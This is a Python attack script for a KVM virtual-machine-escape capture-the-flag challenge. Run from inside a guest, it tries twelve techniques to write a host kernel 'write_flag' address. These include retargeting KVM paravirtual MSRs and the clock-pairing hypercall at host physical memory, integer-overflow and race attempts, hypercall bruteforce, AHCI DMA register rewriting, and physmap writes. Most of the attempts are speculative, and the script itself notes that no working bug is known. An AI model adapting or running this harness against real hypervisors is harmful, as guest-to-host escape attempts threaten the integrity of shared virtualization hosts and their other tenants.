#!/usr/bin/env python3
"""
KVM CTF VM Escape Exploit v11.0

GOAL:
  Write to HOST kernel's write_flag @ 0xffffffff826279a8 (phys: 0x64279a8)
  Then HC #100 returns flag (pattern: deadbeef41424344 or similar)

KVM MEMORY WRITE PATHS WE CAN EXPLOIT:
  1. MSR_KVM_STEAL_TIME - KVM writes steal_time struct to GPA
  2. MSR_KVM_ASYNC_PF_EN - KVM writes async PF data to GPA  
  3. MSR_KVM_SYSTEM_TIME - KVM writes pvclock struct to GPA
  4. KVM_HC_CLOCK_PAIRING - KVM writes clock_pairing struct to GPA

ATTACK VECTORS:
  - Set MSR target address to host physical address
  - Trigger memslot cache confusion
  - Race condition between validation and write
  - Integer overflow in GPA calculation
"""

import os
import sys
import struct
import time
import argparse
from typing import Optional, Tuple

try:
    from kvm_probe_interface import KVMProbe
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from kvm_probe_interface import KVMProbe

# ============================================================================
# Constants
# ============================================================================

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; E = '\033[0m'
    BOLD = '\033[1m'

# Target addresses
WRITE_FLAG_PHYS = 0x64279a8
WRITE_FLAG_VIRT = 0xffffffff826279a8

# KVM MSRs that write to guest memory
MSR_KVM_WALL_CLOCK = 0x11
MSR_KVM_SYSTEM_TIME = 0x12
MSR_KVM_WALL_CLOCK_NEW = 0x4b564d00
MSR_KVM_SYSTEM_TIME_NEW = 0x4b564d01
MSR_KVM_ASYNC_PF_EN = 0x4b564d02
MSR_KVM_STEAL_TIME = 0x4b564d03
MSR_KVM_PV_EOI_EN = 0x4b564d04
MSR_KVM_ASYNC_PF_INT = 0x4b564d06
MSR_KVM_ASYNC_PF_ACK = 0x4b564d07

# KVM MSR flags
KVM_MSR_ENABLED = 1
KVM_ASYNC_PF_ENABLED = (1 << 0)
KVM_ASYNC_PF_SEND_ALWAYS = (1 << 1)
KVM_ASYNC_PF_DELIVERY_AS_PF_VMEXIT = (1 << 2)
KVM_ASYNC_PF_DELIVERY_AS_INT = (1 << 3)

# Standard KVM hypercalls
KVM_HC_CLOCK_PAIRING = 9

def banner():
    print(f"""{C.R}
╔═══════════════════════════════════════════════════════════════════════════╗
║  {C.W}KVM CTF VM Escape Exploit v11.0{C.R}                                         ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {C.Y}Target:{C.R}  write_flag @ host 0x64279a8                                   ║
║  {C.Y}Method:{C.R}  Exploit KVM memory write paths (MSRs, hypercalls)            ║
║  {C.Y}Flag:{C.R}    HC #100 returns deadbeef41424344 pattern when successful    ║
╚═══════════════════════════════════════════════════════════════════════════╝
{C.E}""")

# ============================================================================
# Exploit Class
# ============================================================================

class KVMEscape:
    def __init__(self, verbose: bool = False):
        self.probe = None
        self.verbose = verbose
        
        try:
            self.probe = KVMProbe(verbose=verbose)
            if not self.probe.is_available() or not self.probe.test_connection():
                print(f"{C.R}[-]{C.E} Cannot connect to kvm_probe_drv")
                self.probe = None
                return
            print(f"{C.G}[+]{C.E} Connected to kvm_probe_drv")
        except Exception as e:
            print(f"{C.R}[-]{C.E} Init failed: {e}")
            self.probe = None
    
    def close(self):
        if self.probe:
            self.probe.close()
    
    def log(self, msg: str, level: str = "info"):
        prefix = {
            "info": f"{C.B}[*]{C.E}", "ok": f"{C.G}[+]{C.E}", "warn": f"{C.Y}[!]{C.E}",
            "err": f"{C.R}[-]{C.E}", "try": f"{C.M}[TRY]{C.E}", 
            "flag": f"{C.G}{C.BOLD}[FLAG]{C.E}", "msr": f"{C.CY}[MSR]{C.E}"
        }.get(level, "[?]")
        print(f"  {prefix} {msg}")
    
    def hc(self, nr: int, a0: int = 0, a1: int = 0, a2: int = 0, a3: int = 0) -> int:
        return self.probe.hypercall(nr, a0, a1, a2, a3)
    
    def check_hc100(self) -> Tuple[bool, int]:
        """
        Check HC #100 return value.
        Returns (success, value) where success=True if flag pattern detected.
        """
        ret = self.hc(100, 0, 0, 0, 0)
        
        # Check for the expected pattern: deadbeef41424344 or similar
        # The flag will be returned when write_flag is non-zero
        if ret != 0:
            self.log(f"HC #100 returned: 0x{ret:016x}", "ok")
            
            # Try interpreting as bytes
            b = struct.pack('<Q', ret)
            
            # Check for readable ASCII
            try:
                text = b.decode('ascii', errors='ignore')
                if any(c.isalnum() for c in text):
                    self.log(f"  As ASCII: {repr(text)}", "info")
            except:
                pass
            
            # Check for known patterns
            if ret == 0xdeadbeef41424344 or ret == 0x4443424144414544:
                self.log("FLAG PATTERN DETECTED!", "flag")
                return True, ret
            
            # Any non-zero might indicate success
            return True, ret
        
        return False, ret
    
    def wrmsr(self, msr: int, value: int) -> bool:
        """Write to MSR via our driver"""
        try:
            return self.probe.write_msr(msr, value)
        except:
            return False
    
    def rdmsr(self, msr: int) -> Optional[int]:
        """Read MSR via our driver"""
        try:
            return self.probe.read_msr(msr)
        except:
            return None
    
    # ========================================================================
    # ATTACK 1: MSR_KVM_STEAL_TIME
    # ========================================================================
    
    def attack_steal_time(self):
        """
        KVM's steal_time MSR causes KVM to periodically write a 64-byte
        struct kvm_steal_time to a GPA we specify.
        
        If we set the GPA to the host's write_flag physical address,
        and there's a validation bug, KVM might write there.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 1: MSR_KVM_STEAL_TIME{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # steal_time MSR format: GPA (aligned) | flags
        # GPA must be 32-byte aligned (bits 0-4 reserved, bit 0 = enabled)
        
        targets = [
            WRITE_FLAG_PHYS & ~0x1F,  # 32-byte aligned
            WRITE_FLAG_PHYS,
            WRITE_FLAG_VIRT & 0xFFFFFFFF,  # Lower 32 bits
        ]
        
        for target in targets:
            # Value = GPA | KVM_MSR_ENABLED
            value = (target & ~0x1F) | KVM_MSR_ENABLED
            
            self.log(f"Setting STEAL_TIME to 0x{value:x}", "msr")
            
            if self.wrmsr(MSR_KVM_STEAL_TIME, value):
                # Force a context switch to trigger steal_time update
                time.sleep(0.1)
                
                success, ret = self.check_hc100()
                if success and ret != 0:
                    self.log(f"STEAL_TIME exploit might have worked!", "flag")
                    return ret
            
            # Also try with different flag combinations
            for flags in [0, 1, 3, 0x1F]:
                value = (target & ~0x1F) | flags
                self.wrmsr(MSR_KVM_STEAL_TIME, value)
                time.sleep(0.05)
                
                success, ret = self.check_hc100()
                if success and ret != 0:
                    return ret
        
        # Disable
        self.wrmsr(MSR_KVM_STEAL_TIME, 0)
        return None
    
    # ========================================================================
    # ATTACK 2: MSR_KVM_ASYNC_PF
    # ========================================================================
    
    def attack_async_pf(self):
        """
        Async page fault MSR causes KVM to write PF notification data
        to a GPA we specify.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 2: MSR_KVM_ASYNC_PF_EN{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        targets = [
            WRITE_FLAG_PHYS & ~0x3F,  # 64-byte aligned
            WRITE_FLAG_PHYS,
        ]
        
        for target in targets:
            # Format: GPA | flags
            # Bits 0-5: flags, bits 6+: GPA (64-byte aligned)
            
            flags_combos = [
                KVM_ASYNC_PF_ENABLED,
                KVM_ASYNC_PF_ENABLED | KVM_ASYNC_PF_SEND_ALWAYS,
                KVM_ASYNC_PF_ENABLED | KVM_ASYNC_PF_DELIVERY_AS_INT,
            ]
            
            for flags in flags_combos:
                value = (target & ~0x3F) | flags
                
                self.log(f"Setting ASYNC_PF_EN to 0x{value:x}", "msr")
                
                if self.wrmsr(MSR_KVM_ASYNC_PF_EN, value):
                    # Also set the interrupt vector if using INT delivery
                    if flags & KVM_ASYNC_PF_DELIVERY_AS_INT:
                        self.wrmsr(MSR_KVM_ASYNC_PF_INT, 0x20)  # Vector 32
                    
                    # Try to trigger async PF by accessing unmapped memory
                    # This might cause KVM to write to our target
                    time.sleep(0.1)
                    
                    success, ret = self.check_hc100()
                    if success and ret != 0:
                        self.log(f"ASYNC_PF exploit might have worked!", "flag")
                        return ret
        
        # Disable
        self.wrmsr(MSR_KVM_ASYNC_PF_EN, 0)
        return None
    
    # ========================================================================
    # ATTACK 3: MSR_KVM_SYSTEM_TIME (pvclock)
    # ========================================================================
    
    def attack_system_time(self):
        """
        System time MSR causes KVM to write pvclock data to a GPA.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 3: MSR_KVM_SYSTEM_TIME{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        targets = [
            WRITE_FLAG_PHYS,
            WRITE_FLAG_PHYS & ~0xFFF,  # Page aligned
        ]
        
        for target in targets:
            # Try both old and new MSR
            for msr in [MSR_KVM_SYSTEM_TIME, MSR_KVM_SYSTEM_TIME_NEW]:
                value = target | KVM_MSR_ENABLED
                
                msr_name = "SYSTEM_TIME" if msr == MSR_KVM_SYSTEM_TIME else "SYSTEM_TIME_NEW"
                self.log(f"Setting {msr_name} to 0x{value:x}", "msr")
                
                if self.wrmsr(msr, value):
                    time.sleep(0.1)
                    
                    success, ret = self.check_hc100()
                    if success and ret != 0:
                        self.log(f"{msr_name} exploit might have worked!", "flag")
                        return ret
        
        return None
    
    # ========================================================================
    # ATTACK 4: KVM_HC_CLOCK_PAIRING
    # ========================================================================
    
    def attack_clock_pairing(self):
        """
        Clock pairing hypercall writes 80 bytes to a GPA.
        Try various GPA values that might confuse the validation.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 4: KVM_HC_CLOCK_PAIRING{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        targets = [
            WRITE_FLAG_PHYS,
            WRITE_FLAG_PHYS & ~0xFFF,
            WRITE_FLAG_VIRT,  # Try host virtual as GPA (confusion)
            0xFFFFFFFF00000000 | WRITE_FLAG_PHYS,  # High bits set
            -WRITE_FLAG_PHYS & 0xFFFFFFFFFFFFFFFF,  # Negative
        ]
        
        for target in targets:
            self.log(f"CLOCK_PAIRING to 0x{target:x}", "try")
            
            ret = self.hc(KVM_HC_CLOCK_PAIRING, target, 0, 0, 0)
            
            if ret != 0xfffffffffffffc18:  # Not ENOSYS
                self.log(f"  Returned: 0x{ret:x}", "info")
            
            success, hc100_ret = self.check_hc100()
            if success and hc100_ret != 0:
                return hc100_ret
        
        return None
    
    # ========================================================================
    # ATTACK 5: Integer overflow in address calculation
    # ========================================================================
    
    def attack_integer_overflow(self):
        """
        Try to cause integer overflow in KVM's address calculations.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 5: INTEGER OVERFLOW{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Values that might cause overflow
        overflow_values = [
            0xFFFFFFFFFFFFFFFF,
            0x8000000000000000,
            0x7FFFFFFFFFFFFFFF,
            0xFFFFFFFF00000000,
            0x100000000 - WRITE_FLAG_PHYS,  # Might wrap to target
            0x10000000000000000 - WRITE_FLAG_PHYS,  # 64-bit wrap
        ]
        
        for msr in [MSR_KVM_STEAL_TIME, MSR_KVM_SYSTEM_TIME_NEW, MSR_KVM_ASYNC_PF_EN]:
            for val in overflow_values:
                val_with_enable = val | KVM_MSR_ENABLED
                
                self.log(f"MSR 0x{msr:x} = 0x{val_with_enable:x}", "try")
                
                try:
                    self.wrmsr(msr, val_with_enable)
                    time.sleep(0.05)
                    
                    success, ret = self.check_hc100()
                    if success and ret != 0:
                        return ret
                except:
                    pass
        
        return None
    
    # ========================================================================
    # ATTACK 6: Race condition
    # ========================================================================
    
    def attack_race_condition(self):
        """
        Try to trigger race conditions by rapidly changing MSR values.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 6: RACE CONDITIONS{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        self.log("Attempting rapid MSR switching...", "try")
        
        valid_gpa = 0x100000  # Valid guest address
        target = WRITE_FLAG_PHYS
        
        # Rapidly switch between valid and target addresses
        for _ in range(100):
            # Set to valid
            self.wrmsr(MSR_KVM_STEAL_TIME, valid_gpa | KVM_MSR_ENABLED)
            
            # Quickly switch to target
            self.wrmsr(MSR_KVM_STEAL_TIME, target | KVM_MSR_ENABLED)
            
            # Check
            success, ret = self.check_hc100()
            if success and ret != 0:
                return ret
        
        # Try with clock pairing
        self.log("Attempting rapid clock pairing...", "try")
        
        for _ in range(50):
            self.hc(KVM_HC_CLOCK_PAIRING, valid_gpa, 0, 0, 0)
            self.hc(KVM_HC_CLOCK_PAIRING, target, 0, 0, 0)
            
            success, ret = self.check_hc100()
            if success and ret != 0:
                return ret
        
        return None
    
    # ========================================================================
    # ATTACK 7: Direct hypercall with host addresses
    # ========================================================================
    
    def attack_direct_hypercall(self):
        """
        The CTF might have custom hypercalls that write to host addresses.
        Try HC #100 itself with various arguments.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 7: DIRECT HYPERCALL MANIPULATION{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Maybe HC #100 itself can be used to set write_flag
        # Try various argument patterns
        
        patterns = [
            (WRITE_FLAG_PHYS, 0x1, 0, 0),
            (0x1, WRITE_FLAG_PHYS, 0, 0),
            (WRITE_FLAG_PHYS, 0xdeadbeef, 0x41424344, 0),
            (0xdeadbeef, WRITE_FLAG_PHYS, 0x41424344, 0),
            (WRITE_FLAG_VIRT, 0x1, 0, 0),
            (0x1, WRITE_FLAG_VIRT, 0, 0),
        ]
        
        for args in patterns:
            self.log(f"HC #100(0x{args[0]:x}, 0x{args[1]:x}, 0x{args[2]:x}, 0x{args[3]:x})", "try")
            
            ret = self.hc(100, args[0], args[1], args[2], args[3])
            
            if ret != 0:
                self.log(f"  Returned: 0x{ret:016x}", "ok")
                return ret
        
        return None
    
    # ========================================================================
    # ATTACK 8: EPT/Memory slot manipulation
    # ========================================================================
    
    def attack_memory_confusion(self):
        """
        Try to confuse KVM's memory slot handling.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 8: MEMORY SLOT CONFUSION{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # The host write_flag at 0x64279a8 is ~100MB into physical memory
        # If guest RAM starts at HPA 0, writing to GPA 0x64279a8 might hit it
        
        self.log("Writing to GPA that matches host PA...", "try")
        
        # Write various values to the target GPA
        for val in [0x1, 0xdeadbeef, 0x41424344]:
            data = struct.pack('<Q', val)
            self.probe.write_physical(WRITE_FLAG_PHYS, data)
            
            # Flush cache
            self.probe.wbinvd()
            
            success, ret = self.check_hc100()
            if success and ret != 0:
                self.log(f"Direct GPA write worked!", "flag")
                return ret
        
        # Try with clock pairing to same address
        # This uses kvm_write_guest which translates GPA->HVA
        self.log("Combining with clock_pairing...", "try")
        
        # Write our trigger value to the address
        self.probe.write_physical(WRITE_FLAG_PHYS, struct.pack('<Q', 0x1))
        self.probe.wbinvd()
        
        # Call clock pairing to same address - might trigger caching issues
        self.hc(KVM_HC_CLOCK_PAIRING, WRITE_FLAG_PHYS, 0, 0, 0)
        
        success, ret = self.check_hc100()
        if success and ret != 0:
            return ret
        
        return None
    
    # ========================================================================
    # ATTACK 9: Kernel physmap exploitation
    # ========================================================================
    
    def attack_physmap(self):
        """
        Try to write to host via kernel's physmap (direct mapping).
        If we can find host's physmap base, we might be able to access host memory.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 9: KERNEL PHYSMAP{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Get KASLR info
        kaslr = self.probe.get_kaslr_info()
        
        if kaslr and kaslr.physmap_base:
            self.log(f"Guest physmap base: 0x{kaslr.physmap_base:x}", "info")
            
            # The guest's physmap maps guest physical memory
            # But if there's a bug, we might be able to use it to access host memory
            
            # Try writing via physmap to the target
            physmap_target = kaslr.physmap_base + WRITE_FLAG_PHYS
            
            self.log(f"Trying write to physmap+target: 0x{physmap_target:x}", "try")
            
            try:
                self.probe.write_kernel(physmap_target, struct.pack('<Q', 0xdeadbeef))
                
                success, ret = self.check_hc100()
                if success and ret != 0:
                    return ret
            except Exception as e:
                self.log(f"Write failed: {e}", "err")
        
        return None
    
    # ========================================================================
    # ATTACK 10: MMIO/DMA confusion
    # ========================================================================
    
    def attack_mmio_dma(self):
        """
        Try to confuse MMIO handling to write to host addresses.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 10: MMIO/DMA CONFUSION{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # AHCI might allow DMA to arbitrary addresses
        ahci_bases = [0xfebf0000, 0xfebd0000, 0xfeb00000]
        
        for ahci_base in ahci_bases:
            data = self.probe.read_physical(ahci_base, 4)
            if not data or data == b'\xff\xff\xff\xff':
                continue
            
            self.log(f"Found AHCI at 0x{ahci_base:x}", "ok")
            
            # Try to set up a command that DMAs to host address
            for port in range(6):
                port_base = ahci_base + 0x100 + port * 0x80
                
                # Stop port first
                pxcmd = self.probe.read_dword(port_base + 0x18)
                if pxcmd is None:
                    continue
                
                self.probe.write_dword(port_base + 0x18, pxcmd & ~0x11)
                time.sleep(0.02)
                
                # Set FIS/CLB to target host address
                self.probe.write_dword(port_base + 0x08, WRITE_FLAG_PHYS & 0xFFFFFFFF)
                self.probe.write_dword(port_base + 0x0C, (WRITE_FLAG_PHYS >> 32) & 0xFFFFFFFF)
                self.probe.write_dword(port_base + 0x00, WRITE_FLAG_PHYS & 0xFFFFFFFF)
                self.probe.write_dword(port_base + 0x04, (WRITE_FLAG_PHYS >> 32) & 0xFFFFFFFF)
                
                # Re-enable
                self.probe.write_dword(port_base + 0x18, 0x11)
                
                # Issue a command
                self.probe.write_dword(port_base + 0x38, 1)
                
                time.sleep(0.05)
                
                success, ret = self.check_hc100()
                if success and ret != 0:
                    return ret
        
        return None
    
    # ========================================================================
    # ATTACK 11: Hypercall bruteforce
    # ========================================================================
    
    def attack_hypercall_bruteforce(self):
        """
        Bruteforce hypercall numbers and arguments
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 11: HYPERCALL BRUTEFORCE{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        self.log("Trying additional hypercall numbers...", "try")
        
        # Try hypercall numbers beyond the standard range
        # CTF might have custom ones
        
        target = WRITE_FLAG_PHYS
        trigger = 0xdeadbeef41424344
        
        for hc_nr in list(range(100, 120)) + list(range(200, 210)) + list(range(0x1000, 0x1010)):
            # Pattern: (target, value)
            ret = self.hc(hc_nr, target, trigger, 0, 0)
            
            if ret not in [0, 0xfffffffffffffc18]:  # Not 0 or ENOSYS
                self.log(f"HC {hc_nr} returned: 0x{ret:x}", "ok")
            
            success, ret100 = self.check_hc100()
            if success and ret100 != 0:
                self.log(f"Success after HC {hc_nr}!", "flag")
                return ret100
        
        return None
    
    # ========================================================================
    # ATTACK 12: EPT manipulation via page table writes
    # ========================================================================
    
    def attack_page_table(self):
        """
        Try to manipulate guest page tables to map host memory.
        """
        
        print(f"\n{C.M}{'='*70}{C.E}")
        print(f"{C.M} ATTACK 12: PAGE TABLE MANIPULATION{C.E}")
        print(f"{C.M}{'='*70}{C.E}")
        
        # Read CR3 to get page table base
        cr3 = self.probe.read_cr(3)
        if cr3:
            self.log(f"CR3: 0x{cr3:x}", "info")
            
            # Try to create a mapping to the target host address
            # This would require modifying the page tables
            # But KVM's EPT/shadow page tables should prevent this
            
            # Try reading page table entries
            pml4_addr = cr3 & ~0xFFF
            
            self.log(f"PML4 at: 0x{pml4_addr:x}", "info")
            
            # Read first few entries
            for i in range(4):
                entry = self.probe.read_qword(pml4_addr + i * 8)
                if entry:
                    self.log(f"  PML4[{i}]: 0x{entry:016x}", "info")
        
        return None
    
    # ========================================================================
    # RUN ALL ATTACKS
    # ========================================================================
    
    def run_all(self) -> Optional[int]:
        attacks = [
            ("Direct Hypercall", self.attack_direct_hypercall),
            ("Memory Confusion", self.attack_memory_confusion),
            ("Clock Pairing", self.attack_clock_pairing),
            ("Steal Time MSR", self.attack_steal_time),
            ("Async PF MSR", self.attack_async_pf),
            ("System Time MSR", self.attack_system_time),
            ("Integer Overflow", self.attack_integer_overflow),
            ("Race Condition", self.attack_race_condition),
            ("Physmap", self.attack_physmap),
            ("MMIO/DMA", self.attack_mmio_dma),
            ("Hypercall Bruteforce", self.attack_hypercall_bruteforce),
            ("Page Table", self.attack_page_table),
        ]
        
        for name, func in attacks:
            self.log(f"Running: {name}", "info")
            try:
                ret = func()
                if ret is not None and ret != 0:
                    return ret
            except Exception as e:
                self.log(f"Error in {name}: {e}", "err")
        
        return None

# ============================================================================
# Main
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description='KVM CTF VM Escape Exploit v11.0')
    parser.add_argument('--steal', action='store_true', help='Steal time MSR attack')
    parser.add_argument('--asyncpf', action='store_true', help='Async PF MSR attack')
    parser.add_argument('--systime', action='store_true', help='System time MSR attack')
    parser.add_argument('--clock', action='store_true', help='Clock pairing attack')
    parser.add_argument('--overflow', action='store_true', help='Integer overflow attack')
    parser.add_argument('--race', action='store_true', help='Race condition attack')
    parser.add_argument('--direct', action='store_true', help='Direct hypercall attack')
    parser.add_argument('--memory', action='store_true', help='Memory confusion attack')
    parser.add_argument('--physmap', action='store_true', help='Kernel physmap attack')
    parser.add_argument('--mmio', action='store_true', help='MMIO/DMA attack')
    parser.add_argument('--brute', action='store_true', help='Hypercall bruteforce')
    parser.add_argument('--pagetable', action='store_true', help='Page table attack')
    parser.add_argument('--all', action='store_true', help='Run all attacks')
    parser.add_argument('-v', '--verbose', action='store_true')
    
    args = parser.parse_args()
    
    banner()
    exploit = KVMEscape(verbose=args.verbose)
    
    if not exploit.probe:
        print(f"{C.R}[-]{C.E} Failed to initialize")
        return
    
    try:
        ret = None
        
        if args.all or not any([args.steal, args.asyncpf, args.systime, args.clock,
                                args.overflow, args.race, args.direct, args.memory,
                                args.physmap, args.mmio, args.brute, args.pagetable]):
            ret = exploit.run_all()
        else:
            if args.direct:
                ret = exploit.attack_direct_hypercall()
            if not ret and args.memory:
                ret = exploit.attack_memory_confusion()
            if not ret and args.clock:
                ret = exploit.attack_clock_pairing()
            if not ret and args.steal:
                ret = exploit.attack_steal_time()
            if not ret and args.asyncpf:
                ret = exploit.attack_async_pf()
            if not ret and args.systime:
                ret = exploit.attack_system_time()
            if not ret and args.overflow:
                ret = exploit.attack_integer_overflow()
            if not ret and args.race:
                ret = exploit.attack_race_condition()
            if not ret and args.physmap:
                ret = exploit.attack_physmap()
            if not ret and args.mmio:
                ret = exploit.attack_mmio_dma()
            if not ret and args.brute:
                ret = exploit.attack_hypercall_bruteforce()
            if not ret and args.pagetable:
                ret = exploit.attack_page_table()
        
        if ret is not None and ret != 0:
            print(f"\n{C.G}{'='*70}{C.E}")
            print(f"{C.G}{C.BOLD} HC #100 RETURNED NON-ZERO: 0x{ret:016x}{C.E}")
            
            # Interpret the value
            b = struct.pack('<Q', ret)
            print(f"{C.G} As bytes: {b.hex()}{C.E}")
            try:
                print(f"{C.G} As ASCII: {b.decode('ascii', errors='replace')}{C.E}")
            except:
                pass
            
            print(f"{C.G}{'='*70}{C.E}")
        else:
            print(f"\n{C.R}{'='*70}{C.E}")
            print(f"{C.R} NO SUCCESS - HC #100 still returns 0{C.E}")
            print(f"{C.R}{'='*70}{C.E}")
            print(f"\n{C.Y}The challenge requires writing to HOST memory.{C.E}")
            print(f"{C.Y}We need to find a bug in KVM/kvm_intel that allows{C.E}")
            print(f"{C.Y}guest-controlled data to write outside guest RAM.{C.E}")
    
    finally:
        exploit.close()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!]{C.E} Interrupted")
    except Exception as e:
        print(f"\n{C.R}[!]{C.E} Error: {e}")
        import traceback
        traceback.print_exc()
